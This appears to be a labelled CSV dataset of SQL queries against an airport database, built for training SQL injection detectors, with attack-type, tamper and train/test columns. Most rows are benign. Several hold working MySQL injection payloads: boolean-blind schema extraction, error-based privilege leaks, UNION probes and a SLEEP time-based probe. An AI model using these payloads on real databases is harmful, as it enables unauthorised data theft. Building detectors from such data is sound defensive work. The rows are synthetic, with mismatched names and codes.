"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (94149, ""GL"", ""Godby"", ""VOR-DME"", 110800, ""US"")",0,94149 GL Godby VOR-DME 110800 US,,,,insert,airport-I10,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1313.0 AND 1135.0",0,1313.0 1135.0,,,,select,airport-S2,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 1825.0",0,BR 1825.0,,,,select,airport-S11,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Williamson County Regional Airport"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""LFQI"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""YYO"", ""%"");",0,Williamson County Regional Airport LFQI YYO,,,,select,airport-S17,,,test
"SELECT * FROM airport WHERE continent = ""AF"" AND iso_region LIKE ""TD-SA""",0,AF TD-SA,,,,select,airport-S8,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Columbia_Metropolitan_Airport"" WHERE ident = ""SN8W""",0,https://en.wikipedia.org/wiki/Columbia_Metropolitan_Airport SN8W,,,,update,airport-U3,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""T25"";",0,T25,,,,select,airport-S7,,,test
"UPDATE regions SET keywords = ""Airports in Zambezia Province"" where 6169=6169 and 9767=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 19,1),18,1))>120) then 9767 else (select 7243 union select 5606) end))-- -"" WHERE iso_country = ""LV"";",1," Airports in Zambezia Province"" where 6169=6169 and 9767=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 19,1),18,1))>120) then 9767 else (select 7243 union select 5606) end))-- - LV ",exploit,lowercase,success,update,airport-U9,boolean-102,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""PT Free Port Manyar Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,PT Free Port Manyar Heliport,,,,select,airport-S14,,,test
"UPDATE countries SET keywords = ""Airports in Kiribati"" WHERE code = ""CX"";",0,Airports in Kiribati CX,,,,update,airport-U8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LR"" GROUP BY r.name ORDER BY r.name ASC;",0,LR,,,,select,airport-S16,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AW"" GROUP BY r.name ORDER BY r.name ASC;",0,AW,,,,select,airport-S5,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""CI-LG"", ""SL"", ""Malatya Province"", ""AS"", ""EC"")",0,CI-LG SL Malatya Province AS EC,,,,insert,airport-I5,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SE"", ""Israel"", ""AS"", ""Letiště České republiky, Czechia"")",0,"SE Israel AS Letiště České republiky, Czechia",,,,insert,airport-I6,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""La Vainilla Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,La Vainilla Airport,,,,select,airport-S14,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Jersey Turnpike Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Jersey Turnpike Heliport,,,,select,airport-S14,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Al Aflaj Central Hospital Heliport""",0,Al Aflaj Central Hospital Heliport,,,,select,airport-S3,,,test
"DELETE FROM airport WHERE ident=""SCCU"";",0,SCCU,,,,delete,airport-D1,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""CM"", ""Belarus"", ""AN"", ""مطارات السودان"")",0,CM Belarus AN مطارات السودان,,,,insert,airport-I6,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""M65, KM65"") OR name LIKE ""Vincenzo Florio Airport, Trapani Airport, Aeroporto Vincenzo Florio di Trapani-Birgi""",0,"M65, KM65 Vincenzo Florio Airport, Trapani Airport, Aeroporto Vincenzo Florio di Trapani-Birgi",,,,select,airport-S10,,,test
"UPDATE countries SET keywords = ""مطارات عمان"" WHERE code = ""AG"";",0,مطارات عمان AG,,,,update,airport-U8,,,test
"UPDATE countries SET keywords = ""Lithuanian airports"" WHERE code = ""SB"";",0,Lithuanian airports SB,,,,update,airport-U8,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Mataveri Airport""",0,Mataveri Airport,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Nagoya Lucent Tower Helipad"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Nagoya Lucent Tower Helipad,,,,select,airport-S14,,,test
"UPDATE airport SET name = ""Greenville Forestry Seaplane Base"" WHERE ident = ""SWUD""",0,Greenville Forestry Seaplane Base SWUD,,,,update,airport-U1,,,train
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Kokomo;""",0,Kokomo,,,,select,airport-S21,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4759"" AS SIGNED) AND a.iso_country = ""SB"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4759 SB,,,,select,airport-S22,,,test
"UPDATE countries SET keywords = ""Aeropuertos de Bolivia"" WHERE code = ""LI)))     ORDER         BY   2234#"";",1, Aeropuertos de Bolivia LI)))     ORDER         BY   2234# ,recon,multiplespaces,failure,update,airport-U8,union-98,union,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Aerodromul Sânpetru-Brașov"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""KOSCOM"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""УЕМУ, Аэропорт Усть-Мая"", ""%"");",0,"Aerodromul Sânpetru-Brașov KOSCOM УЕМУ, Аэропорт Усть-Мая",,,,select,airport-S17,,,test
"DELETE FROM countries WHERE code = ""VG"";",0,VG,,,,delete,airport-D7,,,train
"UPDATE regions SET keywords = ""Airports in Tawi-Tawi Province"" WHERE iso_country = ""YE"";",0,Airports in Tawi-Tawi Province YE,,,,update,airport-U9,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""BR""",0,BR,,,,select,airport-S6,,,test
"UPDATE regions SET keywords = ""Airports�inIturi	Province"" WHERE 3264=3264 AND GTID_SUBSET(CONCAT(0x716a706a71,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x71767a6b71),8418)-- FUPW"" WHERE iso_country = ""UA"";",1," Airports�inIturi	Province"" WHERE 3264=3264 AND GTID_SUBSET(CONCAT(0x716a706a71,(SELECT MID((IFNULL(CAST(grantee AS NCHAR),0x20)),1,190) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),0x71767a6b71),8418)-- FUPW UA ",exploit,space2mysqlblank,success,update,airport-U9,error-103,error,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Dauphin"";",0,Dauphin,,,,select,airport-S15,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""AAW, OPAB"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Christoph 41"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""KYL"", ""%"");",0,"AAW, OPAB Christoph 41 KYL",,,,select,airport-S17,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SDWB"";",0,SDWB,,,,select,airport-S7,,,train
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('TTCP','EAL','KUZA','OK59');",0,TTCP EAL KUZA OK59,,,,update,airport-U10,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (91271, ""AMP"", ""-8014))) UNION ALL SELECT NULL,CONCAT(0x7171626a71,0x74555372715951557970,0x7170707171),NULL-- -"", ""VOR-DME"", 240, ""US"")",1," 91271 AMP"" -8014))) UNION ALL SELECT NULL,CONCAT(0x7171626a71,0x74555372715951557970,0x7170707171),NULL-- -"" VOR-DME 240 US ",recon,sleep2getlock,failure,insert,airport-I10,union-56,union,test
"DELETE FROM countries WHERE code = ""BQ"";",0,BQ,,,,delete,airport-D7,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 132.1 AND  122.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  132.7  AND  128.45  ORDER BY frequency;",0,132.1 122.8 132.7 128.45,,,,select,airport-S13,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""CO""",0,CO,,,,select,airport-S6,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 1615.0 AND -3.0",0,1615.0 -3.0,,,,select,airport-S2,,,train
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Ordos_Ejin_Horo_Airport"" WHERE ident = ""JP-3077""",0,https://en.wikipedia.org/wiki/Ordos_Ejin_Horo_Airport JP-3077,,,,update,airport-U3,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""RAF Rufforth"") OR name LIKE ""YCT""",0,RAF Rufforth YCT,,,,select,airport-S10,,,test
"SELECT id FROM airports WHERE type IN (""small_airport"",""closed"") AND scheduled_service LIKE ""no"" AND latitude >= 40.5854988098 AND name LIKE ""%MfrC2qEPwLRZd4NI69zp%"" AND continent = ""OC"" AND longitude BETWEEN 37.426236 AND 126.971998 AND elevation_feet BETWEEN 1559.0 AND 75.0",0,small_airport closed no 40.5854988098 MfrC2qEPwLRZd4NI69zp OC 37.426236 126.971998 1559.0 75.0,,,,select,airport-S23,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5656"" AS SIGNED) AND a.iso_country = ""VU"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5656 VU,,,,select,airport-S22,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2691"" AS SIGNED) AND a.iso_country = ""CA"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2691 CA,,,,select,airport-S22,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Kkotchi;""",0,Kkotchi,,,,select,airport-S21,,,test
SELECT * FROM airport WHERE icao_code = 'FEFW';,0,FEFW,,,,select,airport-S1,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""SI-180"", ""BC"", ""Logar Province"", ""EU"", ""CO"")",0,SI-180 BC Logar Province EU CO,,,,insert,airport-I5,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Cruzan Field"");",0,Cruzan Field,,,,select,airport-S12,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Sovyetskiy;""",0,Sovyetskiy,,,,select,airport-S21,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Vale das Palmeiras Heliport"");",0,Vale das Palmeiras Heliport,,,,select,airport-S12,,,test
"UPDATE airport_frequencies SET description = ""MINNEAPOLIS APP/DEP"" WHERE airport_ident = ""KELN"";",0,MINNEAPOLIS APP/DEP KELN,,,,update,airport-U5,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""AK48"") OR name LIKE ""Zhangjiakou Air Base, 张家口宁远机场, ZZHA""",0,"AK48 Zhangjiakou Air Base, 张家口宁远机场, ZZHA",,,,select,airport-S10,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Fatick Region"";",0,Fatick Region,,,,select,airport-S15,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""QBG"") OR name LIKE ""ENOR, ENXX""",0,"QBG ENOR, ENXX",,,,select,airport-S10,,,test
"SELECT * FROM airport WHERE gps_code = ""SPEP"" OR local_code = ""WY24""",0,SPEP WY24,,,,select,airport-S4,,,test
"UPDATE regions SET keywords = ""Airports in Zambezia Province"" where 8853=8853 and 1024=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 18,1),3,1))>90) then 1024 else (select 5444 union select 9670) end))-- -"" WHERE iso_country = ""LV"";",1," Airports in Zambezia Province"" where 8853=8853 and 1024=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 18,1),3,1))>90) then 1024 else (select 5444 union select 9670) end))-- - LV ",exploit,lowercase,success,update,airport-U9,boolean-102,boolean,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Fazenda Cachoeira do Bambuzal Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Fazenda Cachoeira do Bambuzal Airport,,,,select,airport-S14,,,test
"DELETE FROM regions WHERE name = ""Miren-Kostanjevica"";",0,Miren-Kostanjevica,,,,delete,airport-D8,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""CA-BC""",0,EU CA-BC,,,,select,airport-S8,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""De Soto Parish Airport"") AND 5410=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x726567696f6e73 AND table_schema=0x64617461736574 LIMIT 3,1),3,1))>109) THEN 5410 ELSE (SELECT 8394 UNION SELECT 9800) END))-- -"") OR name LIKE ""De Soto Parish Airport"") AND 5410=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x726567696f6e73 AND table_schema=0x64617461736574 LIMIT 3,1),3,1))>109) THEN 5410 ELSE (SELECT 8394 UNION SELECT 9800) END))-- -""",1," De Soto Parish Airport ) AND 5410=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x726567696f6e73 AND table_schema=0x64617461736574 LIMIT 3,1),3,1))>109) THEN 5410 ELSE (SELECT 8394 UNION SELECT 9800) END))-- - De Soto Parish Airport ) AND 5410=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x726567696f6e73 AND table_schema=0x64617461736574 LIMIT 3,1),3,1))>109) THEN 5410 ELSE (SELECT 8394 UNION SELECT 9800) END))-- - ",exploit,sleep2getlock,success,select,airport-S10,boolean-210,boolean,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""AT-4""",0,EU AT-4,,,,select,airport-S8,,,test
"DELETE FROM countries WHERE code = ""KE"";",0,KE,,,,delete,airport-D7,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""FR"", ""Tonga"", ""EU"", ""Tajik"")",0,FR Tonga EU Tajik,,,,insert,airport-I6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""RO"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,RO 5,,,,select,airport-S19,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (74219, 311598, ""KGVL"", ""GND"", ""Divača+(SELECTmDxmWHERE8725=8725	ORSLEEP(5)#"", 131.8)",1," 74219 311598 ""KGVL"" ""GND"" ""Divača+(SELECTmDxmWHERE8725=8725	ORSLEEP(5 #"" 131.8 ",recon,space2mysqlblank,success,insert,airport-I8,time-46,time,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Sakarya Province"";",0,Sakarya Province,,,,select,airport-S15,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Tokoroyama Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Tokoroyama Heliport,,,,select,airport-S14,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 925.0 AND 2001.0",0,925.0 2001.0,,,,select,airport-S2,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tarry Bank Airport"") and 6888=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 9,1),8,1))>108) then 6888 else (select 1388 union select 2122) end))-- -"");",1," Tarry Bank Airport"") and 6888=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x6e617661696473 and table_schema=0x64617461736574 limit 9,1),8,1))>108) then 6888 else (select 1388 union select 2122) end))-- - ",exploit,lowercase,success,select,airport-S12,boolean-222,boolean,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Garoua_International_Airport"" WHERE ident = ""ID-0025""",0,https://en.wikipedia.org/wiki/Garoua_International_Airport ID-0025,,,,update,airport-U3,,,test
"UPDATE regions SET keywords = ""Airports in Piura Region"" WHERE iso_country = ""MT"";",0,Airports in Piura Region MT,,,,update,airport-U9,,,train
SELECT * FROM airport WHERE icao_code = 'UNSS';,0,UNSS,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PE"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,PE 2,,,,select,airport-S19,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4248"" AS SIGNED) AND a.iso_country = ""EH"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4248 EH,,,,select,airport-S22,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""AR""",0,AR,,,,select,airport-S6,,,test
"DELETE FROM airport_frequencies WHERE type = ""INFO"";",0,INFO,,,,delete,airport-D4,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VN"" GROUP BY r.name ORDER BY r.name ASC;",0,VN,,,,select,airport-S16,,,test
"INSERT INTO countries (code, name, continent) VALUES (""TL"", ""Bahrain"", ""AS"")",0,TL Bahrain AS,,,,insert,airport-I7,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Helicopter Transport Inc / Office Heliport""",0,Helicopter Transport Inc / Office Heliport,,,,select,airport-S3,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (34986, ""9TX9"", 69.0, ""TURF-GRVL-F"", 0, 0)",0,34986 9TX9 69.0 TURF-GRVL-F 0 0,,,,insert,airport-I9,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MU"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,MU 3,,,,select,airport-S19,,,test
"UPDATE regions SET keywords = ""Airports in (unassigned)"" WHERE iso_country = ""BN"";",0,Airports in (unassigned) BN,,,,update,airport-U9,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (71436, 27065, ""KHKS"", ""MISC"", ""DEP"", 37.31)",0,71436 27065 KHKS MISC DEP 37.31,,,,insert,airport-I8,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""KTDO"", ""small_airport"", ""Elsesminde Airfield"", 39.041357, -61.79999923706055)",0,KTDO small_airport Elsesminde Airfield 39.041357 -61.79999923706055,,,,insert,airport-I1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 2376.0 AND 8421.0",0,2376.0 8421.0,,,,select,airport-S2,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""RU""",0,RU,,,,select,airport-S6,,,test
"DELETE FROM airport WHERE name LIKE ""Gilbert Development Corp Heliport"" OR keywords LIKE ""NZ4"";  ",0,Gilbert Development Corp Heliport NZ4,,,,delete,airport-D3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.8 AND  123.4  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  123.0  AND  128.8  ORDER BY frequency;",0,122.8 123.4 123.0 128.8,,,,select,airport-S13,,,test
"INSERT INTO countries (code, name, continent) VALUES (""PM"", ""Comoros"", ""AF"")",0,PM Comoros AF,,,,insert,airport-I7,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""NDGL, Nadergul"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Beltsy International Airport, Lyadoveny Airport, Leadoveny Airport, Lyadoveni Airport, Leadoveni Airport, Аэропорт Бельцы"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""EBGL, EBGL"", ""%"");",0,"NDGL, Nadergul Beltsy International Airport, Lyadoveny Airport, Leadoveny Airport, Lyadoveni Airport, Leadoveni Airport, Аэропорт Бельцы EBGL, EBGL",,,,select,airport-S17,,,test
"DELETE FROM runways WHERE airport_ident = ""EFHK"";",0,EFHK,,,,delete,airport-D5,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Greensburg;""",0,Greensburg,,,,select,airport-S21,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Campovolo Dosolo"") OR name LIKE ""9IL3""",0,Campovolo Dosolo 9IL3,,,,select,airport-S10,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Lura Heliport""",0,Lura Heliport,,,,select,airport-S3,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Jay;""",0,Jay,,,,select,airport-S21,,,test
"DELETE FROM airport WHERE name LIKE ""Ingeniero Luiggi Airport"" OR keywords LIKE ""SJEP"";  ",0,Ingeniero Luiggi Airport SJEP,,,,delete,airport-D3,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""CV"" OR c.name LIKE CONCAT(""%"", ""Mongolia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,CV Mongolia 2,,,,select,airport-S20,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 1835.0",0,US 1835.0,,,,select,airport-S11,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Dzhebariki-Haya Airport, Аэропорт Джебарики-Хая"") OR name LIKE ""SIZN, SD22""",0,"Dzhebariki-Haya Airport, Аэропорт Джебарики-Хая SIZN, SD22",,,,select,airport-S10,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""GB-0896"", ""heliport"", ""Tumby Bay Airport"", 41.5439, -47.145109, 1309.0)",0,GB-0896 heliport Tumby Bay Airport 41.5439 -47.145109 1309.0,,,,insert,airport-I2,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Villard-Notre-Dame, Isère;""",0,"Villard-Notre-Dame, Isère",,,,select,airport-S21,,,test
